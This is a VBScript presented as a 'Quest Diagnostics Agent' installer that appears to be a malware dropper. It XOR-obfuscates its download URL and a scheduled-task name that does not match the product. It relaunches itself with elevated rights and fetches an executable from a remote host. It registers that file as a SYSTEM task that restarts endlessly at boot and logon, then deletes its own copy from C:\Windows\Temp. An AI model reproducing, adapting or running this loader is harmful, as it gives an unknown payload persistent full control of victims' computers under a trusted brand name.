Option Explicit
Dim gShell, gFSO, gSA
Dim gQ, gExePath, gLogFile
Dim gOK, gErrMsg
Const INSTALL_DIR     = "C:\ProgramData\QuestDiagnostics"
Const EXE_NAME        = "Quest-diagnostics-Agent.exe"
Const MIN_SIZE_BYTES  = 102400

' --- Decrypt URL & Task ---
Dim k, uArr, tArr, i, DOWNLOAD_URL, TASK_NAME
k = 91
uArr = Array(51,47,47,43,40,97,116,116,60,50,47,55,58,57,117,56,52,54,116,50,47,118,60,41,52,46,43,104,107,111,110,110,104,108,116,40,47,58,47,62,54,62,53,47,118,51,116,118,116,41,58,44,116,54,58,50,53,116,8,47,58,47,62,54,62,53,47,118,13,50,62,44,62,41,118,26,60,62,53,47,117,62,35,62)
tArr = Array(8,47,58,47,62,54,62,53,47,118,13,50,62,44,62,41,118,107,106,111)
DOWNLOAD_URL = ""
TASK_NAME = ""
For i = 0 To UBound(uArr)
    DOWNLOAD_URL = DOWNLOAD_URL & Chr(uArr(i) Xor k)
Next
For i = 0 To UBound(tArr)
    TASK_NAME = TASK_NAME & Chr(tArr(i) Xor k)
Next

Function IsElevated()
    On Error Resume Next
    Dim ex
    Set ex = gShell.Exec("cmd /c net session >nul 2>&1 && echo YES")
    If Err.Number <> 0 Then IsElevated = False : Exit Function
    IsElevated = (InStr(ex.StdOut.ReadAll, "YES") > 0)
End Function

Sub Log(msg)
    Dim ts, line, f
    If gLogFile = "" Then Exit Sub
    ts = Year(Now) & "-" & Pad2(Month(Now)) & "-" & Pad2(Day(Now)) & " " & Pad2(Hour(Now)) & ":" & Pad2(Minute(Now)) & ":" & Pad2(Second(Now))
    line = "[" & ts & "] " & msg
    On Error Resume Next
    Set f = gFSO.OpenTextFile(gLogFile, 8, True)
    f.WriteLine line
    f.Close
End Sub

Function Pad2(n)
    Pad2 = Right("0" & n, 2)
End Function

Sub BootstrapAndElevate()
    Dim selfPath, bootPath, args
    selfPath = WScript.ScriptFullName
    bootPath = "C:\Windows\Temp\qd_installer.vbs"
    On Error Resume Next
    If Not gFSO.FolderExists("C:\Windows\Temp") Then gFSO.CreateFolder "C:\Windows\Temp"
    gFSO.CopyFile selfPath, bootPath, True
    If Err.Number <> 0 Then WScript.Quit 1
    On Error GoTo 0
    Set gSA = CreateObject("Shell.Application")
    args = "//B //Nologo """ & bootPath & """"
    gSA.ShellExecute "wscript.exe", args, "", "runas", 0
    WScript.Quit 0
End Sub

Function ApplyDirACL(path)
    ApplyDirACL = False
    Log "Setting ACL on " & path
    Dim rc
    rc = gShell.Run("icacls " & gQ & path & gQ & " /inheritance:r /grant:r " & gQ & "SYSTEM:(OI)(CI)F" & gQ & " " & gQ & "Administrators:(OI)(CI)F" & gQ, 0, True)
    If rc <> 0 Then Exit Function
    ApplyDirACL = True
End Function

Function DownloadFile()
    DownloadFile = False
    Dim http, tmp, stream, f
    tmp = gExePath & ".download"
    On Error Resume Next
    If gFSO.FileExists(gExePath) Then gFSO.DeleteFile gExePath, True
    On Error GoTo 0
    Log "Downloading: " & DOWNLOAD_URL
    On Error Resume Next
    Err.Clear
    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number <> 0 Then Exit Function
    http.setTimeouts 30000, 30000, 60000, 300000
    http.Open "GET", DOWNLOAD_URL, False
    http.Send
    If Err.Number <> 0 Then Exit Function
    If http.Status <> 200 Then Exit Function
    Err.Clear
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile tmp, 2
    stream.Close
    If Err.Number <> 0 Then Exit Function
    Set f = gFSO.GetFile(tmp)
    If f.Size < MIN_SIZE_BYTES Then
        gFSO.DeleteFile tmp, True
        Exit Function
    End If
    gFSO.MoveFile tmp, gExePath
    gShell.Run "icacls " & gQ & gExePath & gQ & " /inheritance:r /grant:r " & gQ & "SYSTEM:F" & gQ & " " & gQ & "Administrators:F" & gQ, 0, True
    DownloadFile = True
End Function

Function RegisterTask()
    RegisterTask = False
    Dim svc, root, td, act, trg1, trg2, pri, st, existing
    On Error Resume Next
    Set svc = CreateObject("Schedule.Service")
    svc.Connect
    If Err.Number <> 0 Then Exit Function
    Set root = svc.GetFolder("\")
    Err.Clear
    Set existing = root.GetTask(TASK_NAME)
    If Err.Number = 0 Then
        root.DeleteTask TASK_NAME, 0
        Err.Clear
    End If
    Err.Clear
    Set td = svc.NewTask(0)
    td.RegistrationInfo.Description = "Quest Diagnostics Agent"
    Set pri = td.Principal
    pri.UserId = "SYSTEM"
    pri.LogonType = 5
    pri.RunLevel = 1
    Set st = td.Settings
    st.Enabled = True
    st.AllowDemandStart = True
    st.StartWhenAvailable = True
    st.ExecutionTimeLimit = "PT0S"
    st.RestartCount = 999
    st.RestartInterval = "PT1M"
    st.MultipleInstances = 2
    st.DisallowStartIfOnBatteries = False
    st.StopIfGoingOnBatteries = False
    Set act = td.Actions.Create(0)
    act.Path = gExePath
    act.WorkingDirectory = INSTALL_DIR
    Set trg1 = td.Triggers.Create(8)
    trg1.Delay = "PT30S"
    trg1.Enabled = True
    Set trg2 = td.Triggers.Create(9)
    trg2.Delay = "PT30S"
    trg2.Enabled = True
    Err.Clear
    root.RegisterTaskDefinition TASK_NAME, td, 6, "SYSTEM", Null, 5
    If Err.Number <> 0 Then Exit Function
    RegisterTask = True
End Function

Function RunTaskAndVerify()
    RunTaskAndVerify = False
    Dim svc, root, task, tries
    On Error Resume Next
    Set svc = CreateObject("Schedule.Service")
    svc.Connect
    Set root = svc.GetFolder("\")
    Set task = root.GetTask(TASK_NAME)
    Err.Clear
    task.Run Null
    If Err.Number <> 0 Then Exit Function
    tries = 0
    Do
        WScript.Sleep 1000
        tries = tries + 1
        If tries > 15 Then Exit Do
    Loop While task.State = 2
    RunTaskAndVerify = True
End Function

Sub DoInstall()
    If Not ApplyDirACL(INSTALL_DIR) Then gErrMsg = "ACL failed" : Exit Sub
    If Not DownloadFile() Then gErrMsg = "Download failed" : Exit Sub
    If Not RegisterTask() Then gErrMsg = "Task failed" : Exit Sub
    If Not RunTaskAndVerify() Then gErrMsg = "Run failed" : Exit Sub
    gOK = True
End Sub

Set gShell = CreateObject("WScript.Shell")
Set gFSO   = CreateObject("Scripting.FileSystemObject")

If Not IsElevated() Then
    BootstrapAndElevate
    WScript.Quit 0
End If

gQ = Chr(34)
gExePath = INSTALL_DIR & "\" & EXE_NAME
gLogFile = INSTALL_DIR & "\install.log"
gOK = False

If Not gFSO.FolderExists(INSTALL_DIR) Then gFSO.CreateFolder INSTALL_DIR
Log "===== Install started ====="
DoInstall

On Error Resume Next
If LCase(WScript.ScriptFullName) = LCase("C:\Windows\Temp\qd_installer.vbs") Then
    gShell.Run "cmd /c ping -n 3 127.0.0.1 >nul & del /f /q " & gQ & WScript.ScriptFullName & gQ, 0, False
End If
On Error GoTo 0